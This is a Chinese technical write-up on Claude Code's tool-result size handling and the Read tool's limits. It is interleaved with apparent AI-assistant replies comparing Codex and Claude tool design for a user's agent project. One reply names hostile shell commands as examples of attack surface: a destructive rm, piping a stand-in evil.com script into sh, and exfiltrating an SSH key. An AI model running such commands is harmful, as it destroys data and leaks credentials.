副标题：为什么 Read 不会“过几轮再裁”，以及大日志场景到底怎么处理

适用源码版本：`@anthropic-ai/claude-code` `v2.1.88`

---

# 结论先行

如果先给一句最准确的结论：

**`toolResultBudget` 不是按时间或轮次触发的，而是按“即将发给模型的消息内容大小”触发；但 `Read` 本身不走这套机制。**

这句话其实包含两个层次：

- Cloud Code 有一套“工具结果过大”的处理机制

- `Read` 是这套机制里的例外

很多人在读源码时会把这两层混在一起，于是产生一个误解：

> 如果 `Read` 读出来的内容很大，是不是先放进去，过几轮对话后再被 budget 裁掉？

答案是：

**不是。**

`Read` 在自己的工具层就会控制输出大小。它不会把超大内容先完整塞进上下文，再等几轮后让 `toolResultBudget` 慢慢收拾。

---

你这个区分非常精准——你其实把工具按**「输出的语义契约」**分成了三类,而不是按「功能」分。这是个比「读/写/搜」更深一层的抽象。先肯定这个模型,再回答 Codex 到底有没有考虑。

## 一、你这个三分法的本质

你区分的不是功能,是**「输出是否是稳定的内容契约」**:

| 工具     | 输出性质       | 语义契约                 | 落盘+读回可不可以        |
| -------- | -------------- | ------------------------ | ------------------------ |
| **Bash** | 任意、不可预测 | **无契约**——纯副作用产物 | ✅ 可以,反正本就是临时流 |
| **Grep** | 量大但有结构   | **弱契约**——可摘要/分页  | ✅ 可以,匹配项是衍生数据 |
| **Read** | 文件原文       | **强契约**——必须语义稳定 | ❌ **不行**              |

核心洞察是最后一行:**Read 是「内容的权威来源(source of truth)」,它喂给模型的东西后续要被 Edit/apply_patch 精确引用,所以它的输出必须 = 文件的真实字节,中间不能有「落盘→读回」这种可能引入变形的环节。**

为什么落盘+读回对 Read 致命?因为:

- 编码可能被改(UTF-8 BOM、换行 CRLF→LF)
- 行号基准可能错位
- 截断标记可能混入内容
- 后续 Edit 拿着「读回的内容」去匹配「真实文件」,diff 对不上 → patch 失败

这正是为什么 **Read 不能走你 Mira 这种 `<persisted-output>` 持久化路径**,而 Bash/Grep 可以。你把这条想清楚了。

## 二、Codex 考虑了吗?——考虑了,但用了相反的解法

直接回答:**Codex 没有「忽略」这个问题,但它的解法和你的前提相反——它干脆不设一个独立的、契约化的 Read 工具。**

回顾上几轮:Codex 把读取下沉到 `exec`/shell,以 `apply_patch` 为中心。那它怎么保证「内容语义稳定」?靠两点:

**1. apply_patch 自带「上下文锚定」,不依赖 Read 的输出稳定性**

Codex 的 `apply_patch` 格式不是「按行号改」,而是**带上下文行的 fuzzy 匹配**:

```
*** Update File: src/foo.ts
@@ context line before
-  old line
+  new line
   context line after
```

它在**真实文件**里找这段上下文来定位,而不是依赖「Read 之前返回的行号」。所以即使模型看到的内容和磁盘有偏差,patch 仍按磁盘真实内容匹配。**Codex 把「内容契约」从 Read 端移到了 apply_patch 端**——契约不在「读」,而在「写」的匹配算法里。

**2. exec 读取虽然走 shell(`cat`/`sed -n`),输出经过 stdout,但它不把这个当成「权威内容源」**

Codex 里 `cat file.ts` 的输出,模型用来「理解」,但真正要改时,apply_patch 会**重新读真实文件做匹配**。也就是说:**Codex 容忍「读」的输出不精确,因为它的「写」不信任「读」的输出。**

## 三、两种哲学的对照

这就引出两种根本不同的设计:

|                   | **你/Claude/OpenCode 的路线**           | **Codex 的路线**                               |
| ----------------- | --------------------------------------- | ---------------------------------------------- |
| 谁是内容契约      | **Read 是权威源**,Edit 信任 Read 的行号 | **磁盘文件是权威源**,apply_patch 重新匹配      |
| Read 能否落盘读回 | ❌ 绝对不行(会破坏契约)                 | 无所谓,因为没人信任 Read 的输出                |
| 一致性保障点      | 在 **Read 端**(输出必须 = 真相)         | 在 **apply_patch 端**(写时重新对齐真相)        |
| 代价              | Read 实现要严谨(编码/行号/截断都不能错) | apply_patch 的 fuzzy 匹配要够鲁棒,否则改错地方 |

**所以「Codex 没考虑这个问题吗」的准确答案是:**

> Codex 考虑了「内容语义一致性」,但它认为这个一致性**不该由 Read 工具来保证,而该由写入时的上下文匹配来保证**。于是它根本不需要一个「语义稳定的 Read」——因为它的 apply_patch 每次都回到磁盘真相去对齐,绕开了「读的输出会不会失真」这个问题。

你说的「Read 不能依赖先落盘再读回」是对的;Codex 的回应是「那我索性不让 Read 承担契约责任」。两条路都成立,只是把一致性的「锚点」放在了不同位置。

## 四、对 Liskin 的决策意义

这直接影响你 `packages/tools` 的设计:

1. **如果你走 Claude/OpenCode 路线(独立 Read + 行号 + Edit 按行号改)**:
   - 你的判断完全正确——`fs_read` 必须是稳定内容契约,**绝不能走持久化+读回**,输出必须直接来自 `fs.readFile` 的真实字节
   - Bash/Grep 工具可以走持久化+preview(你 Mira 见过的那套 `<persisted-output>`),因为它们是弱契约
   - 风险点:Edit 信任 Read 的行号,所以两者之间**文件不能被外部改动**,否则行号失效

2. **如果你走 Codex 路线(apply_patch 上下文匹配)**:
   - Read 可以宽松,但 apply_patch 的匹配算法要做扎实(fuzzy + 唯一性校验,匹配到多处要报错)
   - 好处:对「读到的内容轻微失真」有天然容错

3. **务实建议**:Web 端 agent 体验上,**Claude/OpenCode 路线对前端渲染更友好**(行号、结构化 diff 好展示),所以你 `fs_read` 保持「强契约、不落盘读回」是对的;但 `fs_edit` 建议借鉴 Codex 的「上下文锚定」而非纯行号,因为纯行号在多端并发/文件变动下脆弱。**两家各取一半**:Read 学 OpenCode 的严谨,Edit 学 Codex 的鲁棒匹配。

一句话:**Codex 不是没考虑,而是把「内容一致性」的责任从 Read 移到了 apply_patch——它不要求 Read 语义稳定,因为它的写入永远回到磁盘真相重新匹配。你的三分法在「独立 Read 工具」的前提下完全正确,而 Codex 恰恰取消了这个前提。**

要我把这套「Read 强契约(不落盘读回)+ Edit 上下文锚定匹配」的组合,写成你 Liskin tools 层的设计约定文档或参考实现吗?

好问题——这其实是 Codex 和 Claude Code/OpenCode 在工具设计哲学上最根本的分野。为什么 Codex 选择「把能力做成沙箱里跑 shell」而不是「做一堆专用工具」?有四层原因。

## 一、根本原因:能力的「完备性」之争

agent 要操作代码仓库,需要的能力是**无穷的**:读文件、改文件、跑测试、装依赖、git 操作、grep、build、运行脚本……

两条路线:

- **专用工具路线(Claude/OpenCode)**:为每个常见操作做一个工具——`Read`、`Edit`、`Grep`、`Bash`…… 工具集是**有限枚举**。
- **shell 路线(Codex)**:给一个 `exec`,任何能力都是「在 shell 里跑一条命令」。工具集**一个就够,能力无限**。

Codex 的判断是:**与其追着列举工具,不如给模型一个图灵完备的执行环境。** `cat`、`sed`、`rg`、`pytest`、`git`——这些工具开发者用了几十年,模型在训练语料里见过海量 shell 用法,**模型本就「会用 shell」**。专用工具反而要模型重新学一套私有 API。

## 二、模型的先验:shell 是 LLM 的「母语」

这是最被低估的一点。GPT 系列在预训练里吞了无数 README、Stack Overflow、shell 脚本、CI 配置。模型对 `grep -rn "foo" src/`、`find . -name "*.ts"` 的掌握程度,**远超你新造的 `fs_search({pattern, glob})`**。

给 shell,等于复用模型已有的庞大先验;给专用工具,等于强迫模型用一套训练数据稀疏的私有协议。Codex 选择「顺着模型的能力走」。

## 三、代价:能力越大,安全风险越大 → 所以必须重沙箱

shell 路线的代价是显而易见的:`rm -rf /`、`curl evil.com | sh`、读 `~/.ssh/id_rsa` 外传——一个 `exec` 工具把整个系统的攻击面都暴露了。

这就是**为什么 Codex 的沙箱做得那么重**。回到它 codex-rs 的 crate 结构,安全相关的占了一大片:

- `sandboxing` —— 沙箱策略抽象
- `linux-sandbox` —— Linux 上用 Landlock + seccomp 限制文件/系统调用
- `windows-sandbox-rs` —— Windows AppContainer
- `bwrap` —— bubblewrap 容器隔离
- `execpolicy` —— 命令执行策略(哪些命令/路径允许)
- `process-hardening` —— 进程加固
- `secrets` / `keyring-store` —— 凭据隔离

**逻辑链是这样的**:

> 选了 shell 路线(能力完备)→ 攻击面变成「整个操作系统」→ 必须把安全边界做在 OS 内核层(Landlock/seccomp/AppContainer)→ 于是沙箱成了 Codex 工程量最大的部分之一。

换句话说:**Codex 不是「想做沙箱」,而是「选了 shell 就不得不做重沙箱」。** 安全边界从「工具层」被迫下沉到「操作系统层」。

## 四、对比:三家的安全边界放在不同层

|                 | 能力载体          | 安全边界在哪一层                          | 代价                          |
| --------------- | ----------------- | ----------------------------------------- | ----------------------------- |
| **Claude Code** | 专用工具 + Bash   | **工具层**(每个工具自己校验)+ 用户审批    | 工具有限,但每个都要单独写安全 |
| **OpenCode**    | 专用工具 + bash   | **工具层** + permission 系统              | 同上                          |
| **Codex**       | 主要靠 exec/shell | **操作系统内核层**(Landlock/seccomp/容器) | 沙箱极重,但能力完备且隔离最强 |

Claude/OpenCode 是「**限制能让模型做什么**」(枚举安全的工具);Codex 是「**让模型啥都能做,但关进笼子**」(在 OS 层画牢笼)。

## 五、为什么这个选择对 Codex 特别合理

Codex 的定位是**云端/自主执行**(原本是 OpenAI 云上跑的 agent,后来才有 CLI)。在云端无人值守跑 agent:

- 不能每条命令都问用户(没人在屏幕前点批准)→ 必须靠沙箱自动兜底
- 跑在一次性容器里,沙箱炸了也不影响宿主 → 重沙箱 + 容器是天然适配
- 要能跑任意项目的任意构建/测试 → 能力必须完备,专用工具枚举不过来

所以「沙箱执行 shell」是 Codex **云端自主执行定位**的必然结果。而 Claude Code 是**本地 + 人在环路审批**,可以靠用户点「允许」来兜底,专用工具够用。

## 对你 Liskin 的启示

你已经有「Sandbox 三层(路径白名单 + 命令黑名单 + auto/ask/deny)」,这其实是**混合路线**——比 Claude 重、比 Codex 轻,挺务实。关键决策点:

1. **如果 Liskin 要做云端/无人值守执行**:得往 Codex 方向加码,考虑 OS 级隔离(容器/Landlock),光靠路径白名单 + 命令黑名单挡不住 `python -c "import os; os.system(...)"` 这类绕过。
2. **如果主打本地 + 人在环路**:你的三层 + auto/ask/deny 足够,把专用工具(fs_read/fs_edit)做精,bash 工具走 ask 审批即可。
3. **命令黑名单是脆弱的**:黑名单天然挡不全(`rm` 挡了还有 `unlink`、`find -delete`)。Codex 用 OS 层白名单(只允许访问特定路径)比黑名单robust得多——如果你安全要求高,白名单优于黑名单。

一句话:**Codex 做沙箱执行 shell,是因为它选了「shell 提供完备能力 + 复用模型先验」的路线,而这条路线把攻击面放大到整个操作系统,于是被迫把安全边界从工具层下沉到 OS 内核层(Landlock/seccomp/容器)——这又恰好契合它云端自主执行、无人审批的定位。**

要我把 Codex 的沙箱分层(execpolicy 命令策略 + Landlock 路径限制 + 容器隔离)和你 Liskin 现有三层做一次详细映射,看你该补哪一块吗?

# 1. 先把两个机制分开

在 Cloud Code 里，和“工具结果太大”相关的机制，其实有两套。

## 1.1 机制 A：单个工具结果太大

这套机制的目标是：

> 某一个工具单次输出本身就很大，是否应该立刻持久化到磁盘，只给模型预览和路径。

这套机制典型适用于：

- `Bash`

- `Grep`

- 其他可能返回超长文本的工具

相关源码：

- toolResultStorage.ts

- toolResultStorage.ts

## 1.2 机制 B：`toolResultBudget`

这套机制的目标是：

> 一条即将发给模型的 user message 中，如果聚合了太多 `tool_result`，总和太大，就把其中最大的几个替换成 preview。

它不是针对“某个工具单次输出”，而是针对：

- 同一 API 消息里的多个工具结果总和

调用点在：

- query.ts

---

# 2. `toolResultBudget` 到底按什么触发

先直接给答案：

- **不是按时间触发**

- **不是按轮次触发**

- **不是“过几轮以后再裁”**

- **而是按当前消息内容大小触发**

具体预算常量在：

- toolLimits.ts

```shell
export const MAX_TOOL_RESULTS_PER_MESSAGE_CHARS = 200_000
```

意思是：

> 一条 user message 中所有 `tool_result` 内容加起来，如果超过 `200,000` 字符，就触发聚合预算逻辑。

这套逻辑的核心实现是：

- toolResultStorage.ts

源码原意可以概括成：

- 收集当前待发送消息里的 `tool_result`

- 按 API 级 user message 分组

- 检查每一组的总大小

- 如果超预算，就选这一组里最大的“新鲜结果”替换掉

---

# 3. 为什么说它不是按轮数，而是按“消息大小”

`applyToolResultBudget(...)` 每次 query loop 发送请求前都会跑：

- query.ts

```shell
let messagesForQuery = [...getMessagesAfterCompactBoundary(messages)]
messagesForQuery = await applyToolResultBudget(...)
```

也就是说，它的工作方式是：

- 取出当前这次真正要发给模型的消息

- 在发送之前检查是否超预算

所以它的触发条件是：

> **这次要发出去的消息是不是太大**

而不是：

> **这条结果存在了几轮**

---

# 4. 一个非常重要的设计：一旦决定，就冻结

Cloud Code 在 `toolResultBudget` 上有一个很强的设计：

> 某个工具结果第一次经过预算检查时，它的命运就被决定了。

源码在这里：

- toolResultStorage.ts

它维护了：

- `seenIds`

- `replacements`

这意味着：

- 如果某个结果第一次检查时没被替换

- 后面它会被视为 `frozen`

- 之后不会突然在第 4 轮、第 7 轮再被补裁

源码原话：

- toolResultStorage.ts

```shell
Once a result is seen its fate is frozen
```

这样做是为了：

- 保持 prompt cache 稳定

- 避免同一段历史一会儿完整、一会儿被替换

所以如果你问：

> 上一个工具结果是读取日志，那得等几轮之后才能裁剪吧？

答案是：

**不会等几轮。要么第一次进入上下文前就裁，要么永远不裁。**

---

# 5. 那么 `Read` 为什么是例外

这是最核心的问题。

`Read` 在工具定义里明确写了：

- FileReadTool.ts

```shell
// Output is bounded by maxTokens (validateContentTokens). Persisting to a
// file the model reads back with Read is circular — never persist.
maxResultSizeChars: Infinity,
```

这句话要分两层理解：

## 5.1 `Read` 不走单工具结果持久化

因为它把 `maxResultSizeChars` 设成了 `Infinity`，所以不会像 `Bash`、`Grep` 那样走“结果太大就持久化”的路径。

## 5.2 `Read` 也被排除在 `toolResultBudget` 之外

`query.ts` 调用 `applyToolResultBudget(...)` 时，会把 `maxResultSizeChars` 不是有限值的工具名收集成 `skipToolNames`：

- query.ts

```shell
new Set(
  toolUseContext.options.tools
    .filter(t => !Number.isFinite(t.maxResultSizeChars))
    .map(t => t.name),
)
```

而 `Read` 正好就在这个集合里。

后面预算逻辑里有专门注释：

- toolResultStorage.ts

```shell
Tools with maxResultSizeChars: Infinity (Read) — never persist.
Read self-bounds via maxTokens
```

所以结论非常明确：

> **`Read` 不靠 `toolResultBudget` 控制大内容，它靠自己的上限控制。**

---

# 6. `Read` 自己是怎么处理大内容的

`Read` 不是不管大小，而是它自己有两层控制。

相关源码：

- limits.ts

## 6.1 第一层：文件大小限制

默认是：

- `maxSizeBytes = 256 KB`

这层是**预读限制**。

源码原话：

```shell
maxSizeBytes | 256 KB | TOTAL FILE SIZE | throws pre-read
```

这意味着：

- 如果你想全文读一个超大的文本文件

- 系统会先看总大小

- 超过上限就直接报错

## 6.2 第二层：输出 token 限制

默认是：

- `maxTokens = 25,000`

这层是**读完后内容限制**。

源码在：

- FileReadTool.ts

```shell
await validateContentTokens(content, ext, maxTokens)
```

如果 token 超过上限，会直接抛错：

```shell
throw new MaxFileReadTokenExceededError(...)
```

这就说明：

> `Read` 的思路不是“读出来再裁”，而是“超出可读上限就拒绝返回”。

---

# 7. 大日志文件场景到底会怎样

现在用你关心的例子来讲。

假设文件叫：

```plain text
server.log
```

而且这个日志文件非常大，比如 20MB。

## 场景 A：直接全文读

如果模型调用：

```json
{ "file_path": "server.log" }
```

通常会发生：

- 因为没有指定 `limit`

- `Read` 会按全文读取路径处理

- 文件总大小远超 `256KB`

- **直接报错**

- 提示你改用 `offset` / `limit`

也就是说：

**不会把 20MB 日志先塞进上下文，再等系统以后裁。**

## 场景 B：指定范围读取

如果模型调用：

```json
{
  "file_path": "server.log",
  "offset": 10000,
  "limit": 200
}
```

这时：

- 因为设置了 `limit`

- 文件总大小门槛不再按全文硬拦

- 系统只读指定范围

- 再做 token 校验

- 如果这 200 行不大，就正常返回

也就是说：

**大日志的正确读法是“范围读”，不是“全文读”。**

## 场景 C：范围读仍然过大

如果你读的片段本身也很大，比如 5000 行日志，那么：

- 范围读取成功

- `validateContentTokens(...)` 检查 token

- 超出 `25,000` token

- 直接报错

还是不会进入后续 `toolResultBudget`。

---

# 8. 为什么 `Read` 不能像 `Bash` 那样持久化预览

这是一个很深的设计点。

如果 `Read` 也走“太大就落盘 + 只给 preview”的逻辑，会出现一个很蠢的循环：

- 你 `Read` 一个大文件

- 系统说太大了，帮你保存到磁盘

- 模型为了继续看内容，又去 `Read` 这个保存出来的文件

这就变成：

> 用 `Read` 读取 `Read` 自己的产物

源码把这个问题说得很清楚：

- FileReadTool.ts

```shell
Persisting to a file the model reads back with Read is circular — never persist.
```

所以 `Read` 采取的策略不是“持久化大内容”，而是：

- 限制

- 拒绝

- 引导更精确的读取方式

---

# 9. 这和 `Bash` / `Grep` 有什么本质区别

## `Bash`

- 可能输出任意大文本

- 适合走“持久化 + preview”路径

- 因为 Bash 的结果本来就是临时输出，不是标准化内容入口

## `Grep`

- 也可能返回大量匹配

- 适合按模式做摘要、分页或 preview

## `Read`

- 是“标准内容输入器”

- 必须保持内容语义稳定

- 不能依赖“先落盘再读回来”

所以：

> `Bash` / `Grep` 偏向“结果管理”`Read` 偏向“输入控制”

这是很本质的差异。

---

# 10. `Read` 真正的设计哲学是什么

如果把 `Read` 看成“更高级的 `cat`”，其实会严重低估它。

更准确的理解应该是：

> **`Read` 是一个受 token 预算约束的上下文采样器。**

它解决的不是“能不能读”，而是：

- 给模型看多少

- 用什么粒度看

- 如果太大，怎么强迫模型缩小读取范围

这是整个 Agent 运行时里非常高级的一层设计。

因为模型真正需要的，往往不是：

- 全文件

而是：

- 某一段

- 某几页

- 某一段附近上下文

- 某几个命中位置附近的内容

Cloud Code 让 `Read` 把这个边界变成运行时规则，而不是让模型自由发挥。

---

# 11. 实战建议：读日志时最优工具组合是什么

## 不推荐

直接：

```plain text
Read(server.log)
```

因为：

- 很容易超大小限制

- 很容易超 token 限制

- 信息密度也很差

## 推荐

先：

- `Grep` 查关键词

再：

- `Read(offset, limit)` 读命中附近

必要时：

- `Bash` 做更复杂的日志切片、排序、聚合

也就是说：

```plain text
Grep -> Read(range) -> 必要时 Bash
```

这才是 Cloud Code 工具体系希望模型采取的路径。

---

# 12. 最后总结

如果你想把这个问题讲给别人听，可以直接用下面这段总结：

- `toolResultBudget` 不是按轮次或时间触发，而是按消息大小触发。

- 一条工具结果第一次进入上下文时，就决定它是否被替换，之后这个决定会冻结。

- `Read` 不走这套替换机制，因为它自己就是受限的内容输入器。

- `Read` 面对大内容的处理方式不是“延后裁剪”，而是“立即拒绝并要求更精确的读取范围”。

- 所以大日志场景下，正确做法永远不是全文 `Read`，而是 `Grep + Read(range)`。

---

# 13. 一句话结论

> **在 Cloud Code 里，`Read` 处理大内容靠“前置限流”，而 `toolResultBudget` 处理大内容靠“发送前替换”；两者是两条完全不同的路径。**

需要纠正一个理解偏差——这里有两个不同的「缓存」概念被混在一起了。Claude Code 的 Read **并不是返回旧缓存数据**,它每次 Read 都是实时读磁盘的。真正的区别在别处。我拆开讲。

## 一、先澄清:Claude Code 的 Read 不返回旧数据

Claude Code 每次调 `Read`,底层都是**实时 `readFile` 当前磁盘内容**——不存在「第二次 read 读到第一次的旧缓存」。如果文件在两次 read 之间被改了,第二次 read 看到的是新内容。这一点上,**Claude 和 Codex 都是实时读磁盘的**,没区别。

所以「Claude 读旧数据 / Codex 读实时」这个对比**不成立**。它俩在「读」这件事上一样实时。

## 二、那 Claude Code 真正的「缓存」是什么?——是 mtime 一致性校验

Claude Code 确实有个状态机制,但作用相反——它不是为了「用旧数据」,而是**为了防止你用旧数据去写**:

- 每次 Read 一个文件,Claude 会**记下这个文件的「读取时间戳/状态」**
- 当 Edit/Write 要改这个文件时,它会检查:**「这个文件从你上次 Read 之后,在磁盘上被改动过吗?」**
- 如果被外部改过(mtime 变了),Edit 会**报错拒绝**,要求你**重新 Read** 再改

这套机制叫「read-before-write 校验」。它记录的不是「文件内容缓存」,而是「我上次读它是什么时候/什么状态」。目的是:

> 防止「模型基于 5 分钟前读到的旧内容,去 patch 一个已经被改过的文件」——那样会改错地方或覆盖别人的修改。

**所以 Claude 的「缓存」是一致性护栏,不是内容来源。** 它宁可报错让你重读,也不让你拿旧认知去写。

## 三、Codex 的差别在哪?——它不维护「读状态」,靠 apply_patch 当场对齐

上一轮说过,Codex 的 `apply_patch` 是**带上下文行的 fuzzy 匹配**,改文件时**当场去真实磁盘找那段上下文**。它的特性是:

- **不需要记「你上次什么时候 read 过」**——因为它不信任「上次读到的内容」
- 改文件时直接在**当前磁盘真相**里匹配上下文,匹配到就改,匹配不到就失败
- 所以即使模型脑子里是旧内容,只要那段上下文还在磁盘里存在,patch 就能锚定;如果那段被改没了,patch 自然失败(而不是改错)

## 四、两者的真正区别(精确版)

|                     | **Claude Code**                                  | **Codex**                                     |
| ------------------- | ------------------------------------------------ | --------------------------------------------- |
| Read 是否实时读磁盘 | ✅ 实时                                          | ✅ 实时                                       |
| 是否缓存文件内容    | ❌ 不缓存内容                                    | ❌ 不缓存内容                                 |
| 维护「读状态」吗    | ✅ 记录 read 时间戳/状态                         | ❌ 不记录                                     |
| 防写错的机制        | **写前校验**:文件被外部改过 → 拒绝 Edit,要求重读 | **写时对齐**:apply_patch 当场在磁盘匹配上下文 |
| 一致性锚点          | 在「Read→Edit 之间的状态追踪」                   | 在「apply_patch 的上下文匹配」                |
| 哲学                | **悲观锁**:你得先读最新的才准改                  | **乐观匹配**:改的时候再核对真相               |

## 五、所以你的直觉「修正版」

你的直觉方向有一点对、一点偏:

- ❌ **偏的部分**:不是「Claude 读旧数据、Codex 读实时」——两者读都实时
- ✅ **对的部分**:**Claude 更依赖「读」这个动作建立的状态/契约,而 Codex 更"无状态"、更"当场对齐真相"**

更准确的说法是:

> **Claude Code 是「有状态」的——它要求「先读最新、再改」,并用 read 状态追踪来强制这条纪律(被外部改了就拒绝,逼你重读)。Codex 是「无状态」的——它不追踪你读没读、读的新不新,而是把「对齐磁盘真相」的责任全压在 apply_patch 的当场上下文匹配上。**

所以你可以说 Codex 在「写入对齐」这一刻**更实时**(每次 patch 都当场核对磁盘),而 Claude 是在「写入前」用一道校验闸来保证你手里的认知不是旧的——**两者都不会用旧数据写,只是把一致性检查放在了不同时刻**。

## 六、对 Liskin 的取舍

这影响你 `fs_edit` 怎么设计:

1. **Claude 路线(read 状态追踪 + 写前校验)**:
   - 优点:语义清晰,「你没读最新就不让改」很安全
   - 缺点:**多端并发/Web 场景下状态难维护**——你 Liskin 是多端(CLI/Web/IDE),「谁读过、什么时候读的」这个状态跨端同步很麻烦
2. **Codex 路线(无状态 + apply_patch 上下文匹配)**:
   - 优点:**天然适合多端**——不依赖任何会话状态,每次改都回磁盘对齐,任何端任何时刻都安全
   - 缺点:apply_patch 匹配算法要做扎实(上下文唯一性、匹配多处要报错)

**给你的建议**:鉴于 Liskin 是多端解耦架构,**Codex 的无状态路线更适合你**——你不想在 KernelClient 三种实现里都维护「文件读状态」这种跨端易漂移的东西。让 `fs_edit` 走「上下文锚定 + 当场磁盘匹配」,就不用操心「Web 读过的状态 CLI 知不知道」这类分布式一致性噩梦。这和你「内核无状态、外壳无关传输」的架构哲学也一致。

一句话:**两家 Read 都实时读磁盘,谁都不返回旧数据。真正区别是——Claude 用「读状态追踪 + 写前校验」(有状态、悲观),Codex 用「apply_patch 当场对齐磁盘」(无状态、乐观)。你多端架构下,Codex 的无状态路线更省心。**

要我帮你设计 Liskin 的 `fs_edit` 上下文锚定匹配算法(含唯一性校验、匹配失败的错误返回),作为多端安全写入的参考吗?

完全正确——这是个很关键的洞察,你抓到了要害。**因为内核不感知端,read 状态本来就该存在内核里,所以 Claude 路线在你的架构里照样能走通,而且不会有跨端同步问题。** 我之前把这个顾虑说重了,这里修正并讲清楚。

## 一、先承认:我上一轮的顾虑是错位的

我之前说「Claude 路线在多端下要跨端同步 read 状态,是噩梦」——这个顾虑**在你的架构下不成立**。原因正是你说的:

> 内核不感知是 web 读还是 cli 读。

这句话的推论是:**read 状态根本不需要"跨端同步",因为它压根不属于任何一个端,它属于内核里的 session。**

```
            ┌─────────────────────────────┐
   CLI ────▶│                             │
   Web ────▶│   Kernel (单一真相源)        │
   IDE ────▶│   - session 状态            │
            │   - read 状态(mtime 表)    │ ← 状态只此一份
            │   - 文件操作                 │
            └─────────────────────────────┘
```

外壳只是「发 Op、收 EventMsg」的管道,**所有状态都在内核**。read 状态存在内核的 session 里,CLI 读还是 Web 读,对内核没区别——它记的是「session X 在 T 时刻读过文件 F,mtime=M」。下次同一 session 要改 F,内核自己校验,**根本不存在"端之间同步"这回事**。

## 二、所以 Claude 路线在你架构里怎么走

完全可行,而且很干净。把 read 状态做成内核 session 的一部分:

```ts
// 内核侧,挂在 session 上(不在任何外壳)
interface SessionState {
  // 文件路径 → 上次读取时的 mtime/hash
  readState: Map<string, { mtime: number; size: number }>;
}
```

- `fs_read` 执行时:实时读磁盘,**同时**在 `session.readState` 里记下该文件的 mtime
- `fs_edit` 执行时:先查 `session.readState`,比对文件当前 mtime——
  - 没读过 → 报错「请先 Read」
  - 读过但 mtime 变了(被外部改动)→ 报错「文件已变,请重新 Read」
  - 一致 → 放行

这套逻辑**全在内核**,CLI/Web/IDE 三个 KernelClient 一行都不用动,它们只是转发 Op。这就是你「内核不感知端」带来的红利:**有状态的 Claude 路线,在统一内核里反而比在 Claude 的单机进程里更自然。**

## 三、那到底选 Claude 还是 Codex?——真正的取舍点变了

既然跨端同步这个顾虑被你排除了,选型就回到**这两条路线本身的优劣**,跟「多端」无关了:

| 维度                            | **Claude 路线(内核存 read 状态)**      | **Codex 路线(无状态 + 上下文匹配)** |
| ------------------------------- | -------------------------------------- | ----------------------------------- |
| 一致性保障                      | 写前校验 mtime,被改过就拒绝            | 写时在磁盘匹配上下文                |
| 内核状态                        | session 要存 readState 表              | 内核纯无状态                        |
| Edit 难度                       | 简单(按行号/范围改即可)                | 较难(要写鲁棒的 fuzzy 上下文匹配)   |
| 误改风险                        | 低(mtime 守住)                         | 取决于匹配算法质量                  |
| 状态生命周期                    | 要管理 readState 的清理/失效           | 无需管理                            |
| 真·并发写(同一 session 多 turn) | mtime 校验天然防覆盖                   | 上下文匹配天然防覆盖                |
| 跨 session 持久化               | readState 要不要随 session 持久化?复杂 | 无此问题                            |

**新的取舍焦点**:

1. **Claude 路线的真实成本**不是「跨端同步」,而是**「内核要维护一份会随时间失效的状态」**——`readState` 要不要随 session resume 恢复?session 关了清不清?文件被删了表项怎么办?这些是状态管理的固有复杂度,跟端无关。

2. **Codex 路线的真实成本**是**「apply_patch 匹配算法的鲁棒性」**——上下文不唯一怎么办、空白差异怎么容忍、匹配失败的提示够不够好。算法写扎实了,它就是真的省心(内核纯无状态)。

## 四、给 Liskin 的修正建议

既然两条路在你架构里**都能走通**,选择就看你更愿意承担哪种复杂度:

- **想让内核保持无状态**(符合「内核越纯越好」的哲学,session resume / 持久化更简单)→ 走 **Codex 路线**,把功夫花在 apply_patch 匹配算法上
- **想让 Edit 实现简单、一致性语义直观**(「没读最新不让改」很好理解)→ 走 **Claude 路线**,把功夫花在 readState 的生命周期管理上
- **务实折中**:很多实现其实**两者都要一点**——Edit 用上下文锚定(Codex 的鲁棒性),同时内核记一个轻量 mtime 戳做快速预检(Claude 的早失败)。预检失败就提前报错,省得跑完整匹配;预检过了再靠上下文匹配兜底。

## 结论

你说得对——**因为内核不感知端、状态天然集中在内核 session,Claude 路线照样能走,且没有跨端同步问题**。我上一轮把「多端」当成了反对 Claude 路线的理由,这是不准确的。真正的取舍不是「多端能不能用 Claude」,而是:

> **你愿意让内核背一份「会失效、要管理生命周期」的 read 状态(Claude),还是愿意花力气写一个「鲁棒的上下文匹配算法」让内核保持无状态(Codex)?**

跟端无关,跟「你想把复杂度放在状态管理还是匹配算法」有关。考虑到你之前反复强调的「内核越纯越稳定」哲学,我个人倾向 **Codex 无状态 + 一个轻量 mtime 预检** 的折中,但 Claude 纯路线在你架构里绝对走得通。

要我把这个折中方案(上下文锚定匹配 + 内核 session 轻量 mtime 预检)的内核侧设计写出来吗?

对,这个判断方向完全正确。Codex 路线确实**更费 token、更吃上下文、对模型能力要求更高**——这不是缺点,而是它换取「无状态 + 鲁棒」的代价。我把"为什么"和"差多少"拆清楚。

## 一、为什么更费 token:patch 要带「上下文行」

核心在 apply_patch 的格式。Codex 改一行,模型不能只输出「改第 42 行」,而要输出**前后若干行上下文 + 修改**:

```
*** Update File: src/foo.ts
@@ 上下文行 1          ← 这些上下文行
   上下文行 2          ← 不是要改的内容
-  旧的那一行          ← 但必须由模型生成出来
+  新的那一行          ← 用于在磁盘里定位
   下文行 1            ← 全是额外 token
   下文行 2
```

对比 Claude 路线的 Edit(`old_string`→`new_string` 或按行号),Codex 的 patch:

- **要多输出 N 行上下文**(通常前后各 3 行)
- 这些上下文行**纯粹为了定位**,对「改什么」没有信息增量
- 改一行可能要输出 7 行;改十处分散的地方,上下文成本翻几倍

**这是 output token(更贵的那部分)的纯增量开销。**

## 二、为什么更吃上下文窗口:模型得「记住原文」

要生成准确的上下文行,模型必须**先 read 文件、把原文装进上下文,而且记牢**。因为:

- patch 的上下文行必须**和磁盘字节级一致**(差一个空格就匹配失败)
- 模型不能"大概记得",得精确复现那几行
- 所以原文要**完整留在上下文里**直到 patch 生成完——不能提前压缩/遗忘

而 Claude 的行号 Edit,模型只要记住「第 42 行」这个数字 + 新内容,**对原文的记忆精度要求低得多**。Codex 要求模型对原文保持**字节级的工作记忆**,这直接占用更多有效上下文。

## 三、为什么对模型能力要求高:三个硬要求

Codex 路线对模型是真考验:

1. **精确复现能力**:要一字不差地输出原文上下文。弱模型容易把 `  ` 两个空格写成一个、把 `const` 写成 `let`、漏掉一个分号——patch 直接匹配失败。这是为什么 Codex 绑定 GPT-5 系列这种强模型,弱模型用 apply_patch 失败率很高。

2. **长程一致性**:read 到 patch 之间隔了多轮推理,模型要全程记住原文细节不漂移。

3. **格式严格性**:apply_patch 是结构化的自定义 diff 格式,模型要严格遵守 `@@`、`***`、`+/-` 语法,格式错了整个 patch 作废。

